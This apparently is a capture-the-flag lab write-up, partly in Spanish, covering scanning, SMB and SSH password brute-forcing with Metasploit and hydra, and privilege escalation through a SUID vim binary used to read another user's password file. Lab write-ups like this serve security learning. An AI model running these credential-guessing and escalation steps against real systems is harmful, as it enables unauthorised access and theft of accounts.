# Web App Testing and Privilege Escalation

## Find the services exposed by the machine
```
nmap -sS 10.10.153.21
```

```
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

## What is the name of the hidden directory on the web server(enter name without /)?

```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt dir -u 10.10.153.21
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.153.21
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/08/02 04:35:24 Starting gobuster
===============================================================
/development (Status: 301)
Progress: 21973 / 141709 (15.51%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/08/02 04:35:27 Finished
===============================================================
```

**R: development**

## User brute-forcing to find the username & password

Explotar listado samba
en metasploit

```
msfconsole
```
```
use auxiliary/scanner/smb/smb_login
set rhost 10.10.153.21
set user_file /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
set user_as_pass true
run
```
```
[*] 10.10.153.21:445      - 10.10.153.21:445 - Starting SMB login bruteforce
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\root:root'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\admin:admin'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\test:test'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\guest:guest'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\info:info'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\adm:adm'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\mysql:mysql'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\user:user'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\administrator:administrator'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\oracle:oracle'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\ftp:ftp'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\pi:pi'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\puppet:puppet'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\ansible:ansible'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\ec2-user:ec2-user'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\vagrant:vagrant'
[+] 10.10.153.21:445      - 10.10.153.21:445 - Success: '.\azureuser:azureuser'
[*] 10.10.153.21:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

teniendo un listado basico de user:pass samba obtenemos lo que sea que tengan



```
smbget smb://root:root@10.10.153.21/ -R
cat Anonymous/staff.txt
```
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
Teniendo 2 usuarios, jan y kay aplicamos hydra para obtener una clave

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.153.21 ssh -t 4
```

**R: armando**

## What service do you use to access the server(answer in abbreviation in all caps)?

**R: ssh**

## Enumerate the machine to find any vectors for privilege escalation

dentro de lo primero que pruebo es si hay vulnerabilidades suid

```
ssh -l jan 10.10.153.21
find / -perm -04000 -ls 2> /dev/null
```

```
jan@basic2:~$ find / -perm -04000 -ls 2> /dev/null
   536510     40 -rwsr-xr-x   1 root     root        38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   668960     16 -rwsr-xr-x   1 root     root        14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
   524733     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   678565     84 -rwsr-sr-x   1 root     root        85832 Nov 30  2017 /usr/lib/snapd/snap-confine
   525587    420 -rwsr-xr-x   1 root     root       428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
   667081     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   537537   2384 -rwsr-xr-x   1 root     root        2437320 Nov 24  2016 /usr/bin/vim.basic
   537430     24 -rwsr-xr-x   1 root     root          23376 Jan 17  2016 /usr/bin/pkexec
   524537     40 -rwsr-xr-x   1 root     root          39904 May 16  2017 /usr/bin/newgrp
   524410     52 -rwsr-xr-x   1 root     root          49584 May 16  2017 /usr/bin/chfn
   524632    136 -rwsr-xr-x   1 root     root         136808 Jul  4  2017 /usr/bin/sudo
   524412     40 -rwsr-xr-x   1 root     root          40432 May 16  2017 /usr/bin/chsh
   536526     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newgidmap
   537204     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at
   524473     76 -rwsr-xr-x   1 root     root          75304 May 16  2017 /usr/bin/gpasswd
   536525     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newuidmap
   524548     56 -rwsr-xr-x   1 root     root          54256 May 16  2017 /usr/bin/passwd
   262236     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
   263821    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g
   262220     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
   262199     28 -rwsr-xr-x   1 root     root          27608 Nov 30  2017 /bin/umount
   263818     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   262169     40 -rwsr-xr-x   1 root     root          40152 Nov 30  2017 /bin/mount
   262219     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping

```
Interesantemente vim.basic tiene seteado el bit, por lo que podemos leer lo que queramos.

## What is the name of the other user you found(all lower case)?

**R: kay**

## If you have found another user, what can you do with this information?

Veamos que tiene kay

```
ls /home/kay
```

```
jan@basic2:~$ ls /home/kay
pass.bak
```
Tiene un archivo de clave

## What is the final password you obtain?

Leamoslo con vim.basic

```
vim.basic /home/kay/pass.bak
```

**R: heresareallystrongpasswordthatfollowsthepasswordpolicy$$**